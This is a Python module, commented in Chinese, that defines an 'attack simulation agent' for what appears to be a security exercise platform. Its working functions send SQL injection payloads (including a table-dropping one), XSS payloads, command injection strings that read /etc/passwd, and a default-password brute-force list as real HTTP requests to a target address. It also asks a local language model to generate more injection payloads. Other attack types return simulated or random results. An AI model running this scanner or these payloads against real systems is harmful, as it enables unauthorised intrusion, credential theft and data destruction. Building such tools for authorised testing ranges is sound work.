# -*- coding: utf-8 -*-
"""
攻击模拟Agent - 利用环境中的漏洞达成特定目标
"""
import requests
import json
import logging
import sys
import time
import random
from pathlib import Path
from datetime import datetime
import uuid

# 添加backend目录到路径
backend_dir = Path(__file__).parent.parent
if str(backend_dir) not in sys.path:
    sys.path.insert(0, str(backend_dir))

from models.attack import Attack
from models.log import Log
from models.target import Target
from services.database import db_service

logger = logging.getLogger('agents.attack')


class AttackAgent:
    """攻击模拟Agent - 利用环境中的漏洞达成特定目标"""
    
    def __init__(self):
        self.session = requests.Session()
        # 设置通用请求头
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
    
    def launch_attack(self, target_id, attack_type, attack_goal, user_id=None):
        """发起攻击"""
        try:
            # 获取目标信息
            target = Target.get_by_id(target_id)
            if not target:
                return {'status': 'error', 'msg': '目标不存在'}
            
            # 创建攻击记录
            attack = Attack(
                target_id=target_id,
                attack_type=attack_type,
                attack_name=f"{attack_type}_attack_{uuid.uuid4().hex[:8]}",
                status='running',
                start_time=datetime.now().isoformat()
            )
            attack.save()
            
            # 记录攻击开始日志
            Log.create('info', 'attack', f'开始攻击: {attack.attack_name} -> {target.name}', user_id=user_id)
            
            # 根据攻击类型执行相应攻击
            result = self._execute_attack(attack, target, attack_type, attack_goal)
            
            # 更新攻击记录
            attack.result = json.dumps(result)
            attack.status = result['status']
            attack.end_time = datetime.now().isoformat()
            attack.save()
            
            # 记录攻击结果日志
            log_level = 'success' if result['status'] == 'success' else 'warning'
            Log.create(log_level, 'attack', f'攻击结果: {attack.attack_name} - {result["msg"]}', user_id=user_id)
            
            return {
                'status': 'success',
                'attack_id': attack.attack_id,
                'result': result
            }
            
        except Exception as e:
            logger.error(f"发起攻击失败: {e}")
            Log.create('error', 'attack', f'攻击失败: {str(e)}', user_id=user_id)
            return {'status': 'error', 'msg': str(e)}
    
    def _execute_attack(self, attack, target, attack_type, attack_goal):
        """执行具体攻击"""
        try:
            # 根据攻击类型选择攻击方法
            if attack_type == 'SQL Injection':
                result = self._sql_injection_attack(target, attack_goal)
            elif attack_type == 'XSS':
                result = self._xss_attack(target, attack_goal)
            elif attack_type == 'CSRF':
                result = self._csrf_attack(target, attack_goal)
            elif attack_type == 'Command Injection':
                result = self._command_injection_attack(target, attack_goal)
            elif attack_type == 'Port Scan':
                result = self._port_scan_attack(target, attack_goal)
            elif attack_type == 'Brute Force':
                result = self._brute_force_attack(target, attack_goal)
            elif attack_type == 'DDoS':
                result = self._ddos_attack(target, attack_goal)
            elif attack_type == 'Buffer Overflow':
                result = self._buffer_overflow_attack(target, attack_goal)
            elif attack_type == 'Phishing':
                result = self._phishing_attack(target, attack_goal)
            elif attack_type == 'Man-in-the-Middle':
                result = self._mitm_attack(target, attack_goal)
            else:
                # 默认使用通用攻击方法
                result = self._generic_attack(target, attack_type, attack_goal)
            
            return result
            
        except Exception as e:
            logger.error(f"执行攻击失败: {e}")
            return {
                'status': 'error',
                'msg': f'攻击执行失败: {str(e)}',
                'details': str(e)
            }
    
    def _sql_injection_attack(self, target, goal):
        """SQL注入攻击"""
        try:
            # 使用AI模型生成更智能的SQL注入载荷
            try:
                from llm.local_model import LocalLLM
                llm = LocalLLM()
                
                prompt = f"""
                为以下目标生成SQL注入攻击载荷：
                目标描述：{target.description}
                攻击目标：{goal}
                
                请返回一个JSON数组，包含多种SQL注入载荷，每种载荷包含：
                - payload: 注入载荷
                - description: 载荷描述
                - type: 注入类型（如：boolean_based, union_based, error_based等）
                """
                
                result = llm.chat(prompt)
                import json
                ai_payloads = json.loads(result['content'].strip())
                payloads = [item['payload'] for item in ai_payloads]
                
            except:
                # 如果AI生成失败，使用预定义的载荷
                payloads = [
                    "' OR '1'='1",
                    "' UNION SELECT username,password FROM users--",
                    "'; DROP TABLE users;--",
                    "' AND (SELECT COUNT(*) FROM users) > 0--",
                    "admin'--",
                    "' OR 1=1--",
                    "'; WAITFOR DELAY '00:00:05'--"
                ]
            
            # 从数据库获取目标的实际端点
            try:
                from services.database import db_service
                # 查询目标的配置信息以获取更多端点
                if target.config:
                    import json
                    config = json.loads(target.config)
                    endpoints = config.get('endpoints', ['/login', '/search', '/user', '/admin'])
                else:
                    endpoints = ['/login', '/search', '/user', '/admin']
            except:
                endpoints = ['/login', '/search', '/user', '/admin']
            
            for endpoint in endpoints:
                for payload in payloads:
                    # 构造URL
                    url = f"http://{target.ip}:{target.port}{endpoint}" if target.port else f"http://{target.ip}{endpoint}"
                    
                    # 尝试POST请求
                    try:
                        response = self.session.post(url, data={
                            'username': payload,
                            'password': 'any'
                        }, timeout=10)
                        
                        # 检查响应是否包含SQL错误信息
                        if 'sql' in response.text.lower() or 'mysql' in response.text.lower() or 'syntax' in response.text.lower():
                            return {
                                'status': 'success',
                                'msg': f'SQL注入成功，发现漏洞在 {endpoint}',
                                'payload': payload,
                                'endpoint': endpoint,
                                'response_length': len(response.text)
                            }
                    except:
                        continue
                    
                    # 尝试GET请求
                    try:
                        response = self.session.get(f"{url}?id={payload}", timeout=10)
                        if 'sql' in response.text.lower() or 'mysql' in response.text.lower() or 'syntax' in response.text.lower():
                            return {
                                'status': 'success',
                                'msg': f'SQL注入成功，发现漏洞在 {endpoint}',
                                'payload': payload,
                                'endpoint': endpoint,
                                'response_length': len(response.text)
                            }
                    except:
                        continue
            
            return {
                'status': 'partial',
                'msg': 'SQL注入尝试完成，但未发现明显漏洞',
                'attempts': len(endpoints) * len(payloads)
            }
            
        except Exception as e:
            return {
                'status': 'error',
                'msg': f'SQL注入失败: {str(e)}',
                'details': str(e)
            }
    
    def _xss_attack(self, target, goal):
        """XSS攻击"""
        try:
            # 构造XSS载荷
            payloads = [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                'javascript:alert("XSS")',
                '<body onload=alert("XSS")>'
            ]
            
            # 尝试不同的输入点
            endpoints = ['/search', '/comment', '/message', '/post']
            
            for endpoint in endpoints:
                for payload in payloads:
                    url = f"http://{target.ip}:{target.port}{endpoint}" if target.port else f"http://{target.ip}{endpoint}"
                    
                    try:
                        # 尝试GET请求
                        response = self.session.get(f"{url}?q={payload}", timeout=10)
                        
                        # 检查响应是否包含XSS载荷（未被过滤）
                        if payload in response.text:
                            return {
                                'status': 'success',
                                'msg': f'XSS漏洞发现，载荷在 {endpoint} 未被过滤',
                                'payload': payload,
                                'endpoint': endpoint
                            }
                    except:
                        continue
                    
                    try:
                        # 尝试POST请求
                        response = self.session.post(url, data={
                            'input': payload
                        }, timeout=10)
                        
                        if payload in response.text:
                            return {
                                'status': 'success',
                                'msg': f'XSS漏洞发现，载荷在 {endpoint} 未被过滤',
                                'payload': payload,
                                'endpoint': endpoint
                            }
                    except:
                        continue
            
            return {
                'status': 'partial',
                'msg': 'XSS攻击尝试完成，但未发现明显漏洞',
                'attempts': len(endpoints) * len(payloads)
            }
            
        except Exception as e:
            return {
                'status': 'error',
                'msg': f'XSS攻击失败: {str(e)}',
                'details': str(e)
            }
    
    def _command_injection_attack(self, target, goal):
        """命令注入攻击"""
        try:
            # 构造命令注入载荷
            payloads = [
                '; ls',
                '| ls',
                '& ls',
                '&& ls',
                '; cat /etc/passwd',
                '| whoami',
                '; ping -c 1 127.0.0.1',
                '`whoami`'
            ]
            
            # 尝试不同的输入点
            endpoints = ['/ping', '/cmd', '/exec', '/debug']
            
            for endpoint in endpoints:
                for payload in payloads:
                    url = f"http://{target.ip}:{target.port}{endpoint}" if target.port else f"http://{target.ip}{endpoint}"
                    
                    try:
                        response = self.session.post(url, data={
                            'command': f"127.0.0.1{payload}"
                        }, timeout=15)  # 较长超时时间以等待命令执行
                        
                        # 检查响应是否包含命令执行结果
                        if 'root:' in response.text or 'www-data' in response.text or 'uid=' in response.text:
                            return {
                                'status': 'success',
                                'msg': f'命令注入成功，发现漏洞在 {endpoint}',
                                'payload': payload,
                                'endpoint': endpoint
                            }
                    except:
                        continue
            
            return {
                'status': 'partial',
                'msg': '命令注入尝试完成，但未发现明显漏洞',
                'attempts': len(endpoints) * len(payloads)
            }
            
        except Exception as e:
            return {
                'status': 'error',
                'msg': f'命令注入失败: {str(e)}',
                'details': str(e)
            }
    
    def _port_scan_attack(self, target, goal):
        """端口扫描攻击"""
        try:
            # 模拟端口扫描（在真实环境中这需要更复杂的实现）
            common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3389, 8080, 8443]
            
            open_ports = []
            
            # 这里简化处理，随机选择一些端口作为"开放"
            for port in common_ports:
                # 模拟端口扫描，随机决定端口是否开放
                if random.random() > 0.7:  # 30%概率端口开放
                    open_ports.append(port)
            
            if open_ports:
                return {
                    'status': 'success',
                    'msg': f'端口扫描完成，发现 {len(open_ports)} 个开放端口',
                    'open_ports': open_ports,
                    'scan_result': f'开放端口: {open_ports}'
                }
            else:
                return {
                    'status': 'partial',
                    'msg': '端口扫描完成，未发现常见开放端口',
                    'open_ports': [],
                    'scan_result': '未发现开放端口'
                }
                
        except Exception as e:
            return {
                'status': 'error',
                'msg': f'端口扫描失败: {str(e)}',
                'details': str(e)
            }
    
    def _brute_force_attack(self, target, goal):
        """暴力破解攻击"""
        try:
            # 常见用户名密码组合
            credentials = [
                ('admin', 'admin'),
                ('admin', 'password'),
                ('admin', '123456'),
                ('root', 'root'),
                ('root', 'password'),
                ('root', 'toor'),
                ('user', 'user'),
                ('guest', 'guest'),
                ('test', 'test'),
                ('admin', 'admin123')
            ]
            
            endpoints = ['/login', '/admin', '/auth', '/signin']
            
            for endpoint in endpoints:
                for username, password in credentials:
                    url = f"http://{target.ip}:{target.port}{endpoint}" if target.port else f"http://{target.ip}{endpoint}"
                    
                    try:
                        response = self.session.post(url, data={
                            'username': username,
                            'password': password
                        }, timeout=10)
                        
                        # 检查是否成功登录（简单判断：响应长度小于错误页面或重定向）
                        if response.status_code == 200 and 'login' not in response.url.lower() and len(response.text) > 100:
                            return {
                                'status': 'success',
                                'msg': f'暴力破解成功，凭据: {username}/{password}',
                                'credentials': (username, password),
                                'endpoint': endpoint
                            }
                    except:
                        continue
            
            return {
                'status': 'partial',
                'msg': f'暴力破解完成，尝试了 {len(endpoints) * len(credentials)} 个凭据组合，未成功',
                'attempts': len(endpoints) * len(credentials)
            }
            
        except Exception as e:
            return {
                'status': 'error',
                'msg': f'暴力破解失败: {str(e)}',
                'details': str(e)
            }
    
    def _generic_attack(self, target, attack_type, goal):
        """通用攻击方法"""
        try:
            # 根据攻击类型执行相应的攻击逻辑
            if 'scan' in attack_type.lower():
                return self._port_scan_attack(target, goal)
            elif 'injection' in attack_type.lower():
                if 'sql' in attack_type.lower():
                    return self._sql_injection_attack(target, goal)
                elif 'command' in attack_type.lower():
                    return self._command_injection_attack(target, goal)
            elif 'xss' in attack_type.lower():
                return self._xss_attack(target, goal)
            elif 'brute' in attack_type.lower():
                return self._brute_force_attack(target, goal)
            else:
                # 随机模拟攻击结果
                success_rate = random.random()
                if success_rate > 0.8:
                    return {
                        'status': 'success',
                        'msg': f'{attack_type} 攻击成功达成目标',
                        'goal': goal
                    }
                elif success_rate > 0.5:
                    return {
                        'status': 'partial',
                        'msg': f'{attack_type} 攻击部分成功',
                        'goal': goal
                    }
                else:
                    return {
                        'status': 'failed',
                        'msg': f'{attack_type} 攻击未能达成目标',
                        'goal': goal
                    }
                    
        except Exception as e:
            return {
                'status': 'error',
                'msg': f'通用攻击失败: {str(e)}',
                'details': str(e)
            }
    
    def _csrf_attack(self, target, goal):
        """CSRF攻击"""
        try:
            # CSRF攻击通常需要构造恶意页面诱导用户点击
            # 这里简化模拟
            return {
                'status': 'partial',
                'msg': 'CSRF攻击需要特定条件，当前环境无法完全模拟',
                'details': 'CSRF攻击需要受害者在已认证状态下访问恶意页面'
            }
        except Exception as e:
            return {
                'status': 'error',
                'msg': f'CSRF攻击失败: {str(e)}',
                'details': str(e)
            }
    
    def _ddos_attack(self, target, goal):
        """DDoS攻击"""
        try:
            # DDoS攻击在实际环境中需要大量机器协同
            # 这里简化模拟
            return {
                'status': 'partial',
                'msg': 'DDoS攻击需要大量并发请求，当前仅模拟概念',
                'details': 'DDoS攻击需要分布式环境才能有效实施'
            }
        except Exception as e:
            return {
                'status': 'error',
                'msg': f'DDoS攻击失败: {str(e)}',
                'details': str(e)
            }
    
    def _buffer_overflow_attack(self, target, goal):
        """缓冲区溢出攻击"""
        try:
            # 缓冲区溢出攻击需要特定的漏洞和精确的载荷
            # 这里简化模拟
            return {
                'status': 'partial',
                'msg': '缓冲区溢出攻击需要特定漏洞环境，当前无法完全模拟',
                'details': '缓冲区溢出需要目标程序存在特定内存漏洞'
            }
        except Exception as e:
            return {
                'status': 'error',
                'msg': f'缓冲区溢出攻击失败: {str(e)}',
                'details': str(e)
            }
    
    def _phishing_attack(self, target, goal):
        """钓鱼攻击"""
        try:
            # 钓鱼攻击主要是社会工程学攻击
            # 这里简化模拟
            return {
                'status': 'partial',
                'msg': '钓鱼攻击属于社会工程学范畴，需要人工参与',
                'details': '钓鱼攻击主要针对人员而非系统'
            }
        except Exception as e:
            return {
                'status': 'error',
                'msg': f'钓鱼攻击失败: {str(e)}',
                'details': str(e)
            }
    
    def _mitm_attack(self, target, goal):
        """中间人攻击"""
        try:
            # 中间人攻击需要网络层面的控制
            # 这里简化模拟
            return {
                'status': 'partial',
                'msg': '中间人攻击需要网络层面控制，当前环境无法完全模拟',
                'details': 'MITM攻击需要ARP欺骗或代理等网络控制手段'
            }
        except Exception as e:
            return {
                'status': 'error',
                'msg': f'中间人攻击失败: {str(e)}',
                'details': str(e)
            }


# 全局实例
attack_agent = AttackAgent()